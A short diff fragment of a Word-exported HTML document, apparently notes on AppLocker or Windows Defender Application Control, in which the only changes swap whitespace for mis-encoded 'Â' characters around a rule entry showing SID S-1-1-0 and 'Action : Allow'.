+style='mso-spacerun:yes'>Â Â </span>:</span> S-1-1-0<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Action<span
-style='mso-spacerun:yes'>            </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> Allow<o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> Allow<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
 
@@ -2952,7 +2952,7 @@ v:shapes="Picture_x0020_61"><![endif]></span><o:p></o:p></p>
 </v:shape><![endif]--><![if !vml]><img border=0 width=1299 height=318
 src="test_files/image070.png" v:shapes="Picture_x0020_60"><![endif]></span><o:p></o:p></p>
 
-<p class=MsoNormal><span style='mso-spacerun:yes'> </span><o:p></o:p></p>
+<p class=MsoNormal><span style='mso-spacerun:yes'>Â </span><o:p></o:p></p>
 
 <p class=MsoNormal>AppLocker or windows defender application control. <o:p></o:p></p>
 
